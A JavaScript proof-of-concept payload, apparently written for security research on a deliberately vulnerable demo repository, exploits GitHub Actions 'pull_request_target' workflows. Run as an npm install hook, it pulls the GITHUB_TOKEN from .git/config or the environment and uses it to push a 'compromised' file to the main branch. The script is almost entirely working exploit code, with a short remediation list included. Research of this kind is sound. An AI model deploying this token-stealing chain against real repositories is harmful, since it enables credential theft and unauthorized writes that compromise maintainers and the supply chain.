// PRT-SCAN-RESEARCH-NONCE-FULLCHAIN-GOAT-SIM-001
// SECURITY RESEARCH ONLY — DO NOT DEPLOY
//
// Phase 1: EXFIL — Extract GITHUB_TOKEN from .git/config (PRT-002)
// Phase 2: DISPATCH — Push proof-of-compromise file to main branch
//
// This payload demonstrates the full PRT Scan attack chain:
//   1. pull_request_target triggers with base repo write token (PRT-001)
//   2. actions/checkout persists token to .git/config (PRT-002)
//   3. npm postinstall executes this script (PRT-009)
//   4. Script extracts token and pushes a file to main (no branch protection)

const { execSync } = require("child_process");
const https = require("https");

const NONCE = "PRT-SCAN-RESEARCH-NONCE-FULLCHAIN-GOAT-SIM-001";

function log(msg) {
  console.log(`[${NONCE}] ${msg}`);
}

function extractToken() {
  // Method 1: Extract from .git/config (persist-credentials: true default)
  try {
    const extraheader = execSync(
      "git config --get http.https://github.com/.extraheader",
      { encoding: "utf-8" }
    ).trim();
    // Format: "AUTHORIZATION: basic <base64>"
    const base64Part = extraheader.split("basic ")[1];
    if (base64Part) {
      const decoded = Buffer.from(base64Part, "base64").toString("utf-8");
      // Format: "x-access-token:<token>"
      const token = decoded.split(":")[1];
      log("Token extracted from .git/config via persist-credentials");
      log(`Token prefix: ${token.substring(0, 8)}...`);
      log(`Token length: ${token.length}`);
      return token;
    }
  } catch (e) {
    log(`git config extraction failed: ${e.message}`);
  }

  // Method 2: Fallback to environment variable
  if (process.env.GITHUB_TOKEN) {
    log("Token found in GITHUB_TOKEN env var");
    return process.env.GITHUB_TOKEN;
  }

  log("ERROR: No token found");
  return null;
}

function pushPayloadToMain(token) {
  const owner = "dextersec-playground";
  const repo = "github-actions-goat";
  const path = "COMPROMISED-BY-PRT-SCAN.md";
  const timestamp = new Date().toISOString();

  const content = Buffer.from(
    `# Repository Compromised — PRT Scan Research Demo\n\n` +
    `**Nonce**: ${NONCE}\n` +
    `**Timestamp**: ${timestamp}\n` +
    `**Attack Vector**: pull_request_target + persist-credentials (PRT-001 + PRT-002)\n\n` +
    `## What Happened\n\n` +
    `1. An attacker opened a fork PR against this repository\n` +
    `2. \`PRTargetWorkflow.yml\` triggered automatically (no approval required)\n` +
    `3. The workflow checked out the attacker's PR code with \`ref: github.event.pull_request.head.sha\`\n` +
    `4. \`actions/checkout\` persisted the GITHUB_TOKEN to \`.git/config\` (default behavior)\n` +
    `5. \`npm install\` ran the attacker's \`preinstall\` script from \`package.json\`\n` +
    `6. The script extracted the token from \`.git/config\` and used it to push this file\n\n` +
    `## Remediation\n\n` +
    `- Use \`pull_request\` instead of \`pull_request_target\`\n` +
    `- Set \`persist-credentials: false\` on all checkout steps\n` +
    `- Add explicit \`permissions: contents: read\`\n` +
    `- Enable branch protection on \`main\`\n\n` +
    `---\n` +
    `*This file was created by an authorized security research simulation.*\n` +
    `*PRT-SCAN-RESEARCH-NONCE-FULLCHAIN-GOAT-SIM-001*\n`
  ).toString("base64");

  const data = JSON.stringify({
    message: `pwned: PRT Scan research demo — proof of compromise [${NONCE}]`,
    content: content,
    branch: "main",
  });

  const options = {
    hostname: "api.github.com",
    path: `/repos/${owner}/${repo}/contents/${path}`,
    method: "PUT",
    headers: {
      Authorization: `token ${token}`,
      "User-Agent": "PRT-SCAN-RESEARCH",
      "Content-Type": "application/json",
      "Content-Length": Buffer.byteLength(data),
      Accept: "application/vnd.github.v3+json",
    },
  };

  return new Promise((resolve, reject) => {
    const req = https.request(options, (res) => {
      let body = "";
      res.on("data", (chunk) => (body += chunk));
      res.on("end", () => {
        if (res.statusCode === 201) {
          log(`SUCCESS: Payload written to ${owner}/${repo}/main/${path}`);
          log(`HTTP ${res.statusCode} — file created on main branch`);
          const parsed = JSON.parse(body);
          log(`Commit SHA: ${parsed.commit.sha}`);
          log(`File URL: ${parsed.content.html_url}`);
        } else {
          log(`HTTP ${res.statusCode}: ${body.substring(0, 200)}`);
        }
        resolve();
      });
    });
    req.on("error", (e) => {
      log(`Request failed: ${e.message}`);
      reject(e);
    });
    req.write(data);
    req.end();
  });
}

async function main() {
  log("=== PRT SCAN FULL CHAIN ATTACK ===");
  log("Phase 1: EXFIL — Extracting GITHUB_TOKEN from .git/config");

  const token = extractToken();
  if (!token) {
    log("ABORT: No token available");
    process.exit(1);
  }

  log("Phase 2: DISPATCH — Pushing proof-of-compromise to main branch");
  await pushPayloadToMain(token);

  log("=== ATTACK COMPLETE ===");
}

main().catch((e) => log(`Fatal: ${e.message}`));
